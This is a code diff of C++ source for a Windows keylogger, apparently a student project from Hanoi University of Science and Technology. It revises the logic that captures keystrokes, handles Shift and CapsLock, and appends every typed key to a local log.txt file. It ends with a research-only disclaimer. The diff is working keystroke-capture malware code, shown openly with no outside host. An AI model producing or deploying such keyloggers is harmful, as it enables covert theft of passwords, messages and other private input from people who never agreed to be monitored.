@@ -1,8 +1,6 @@
 #define _WIN32_WINNT 0x0500//Indicates the lowest version of Windows that is supported. Change to value 0x0A00 for higher minimum required. 0x0500 indicates Windows 2000.
 #include <Windows.h>//WinAPI Header
 #include <winuser.h>//Keyboard Log Header
-#include <bits/stdc++.h>
-#include <iostream>
 #include <fstream>//For log file.
 #include "log.h"//misc
 #include "ShiftedKeys.h"//misc
@@ -22,7 +20,7 @@ int main(){
 					LogFile.open("log.txt", fstream::app);
 					if (LogFile.is_open()){
 						if (65 <= KEY && KEY <= 90){//characters
-							if (CheckShift()^CheckCapsLock()==0){
+							if (Shift_isOn()^CapsLock_isOn()==0){
 								KEY += 32;
 								LogFile << char(KEY);
 								LogFile.close();
@@ -33,24 +31,20 @@ int main(){
 							}
 						}
 						else if (48<=KEY && KEY <= 57){//numbers
-							if (CheckShift() == 1){
+							if (Shift_isOn() == true){
 								NumberKeyShift(KEY);
-								LogFile << char(KEY);
-								LogFile.close();
 							}
 							else{
 								LogFile << char(KEY);
 								LogFile.close();
 							}
 						}
-						else{
-							if (CheckShift() == 1){
+						else{//misc
+							if (Shift_isOn() == true){
 								MiscKeyShift(KEY);
-								LogFile << char(KEY);
-								LogFile.close();
 							}
 							else{
-								LogFile << char(KEY);
+								LogFile << KEY << ' ';
 								LogFile.close();
 							}
 						}
@@ -61,8 +55,8 @@ int main(){
 				}
 			}
 		}		
-	return 0;
 	}
+	return 0;
 }
 //Disclaimer: This project is for research/educational purpose only. We have no responsibilities if this project is used for any unethical or illegal actions by anyone apart from us.
 // Generated and researched at School of Electronics and Telecommunication, Hanoi University of Science and Technology - 2023 by Nguyen Minh Tuan 20213737 & Mac Quang Huy 20213709 under the instruction of Dr. Hoang Quang Huy
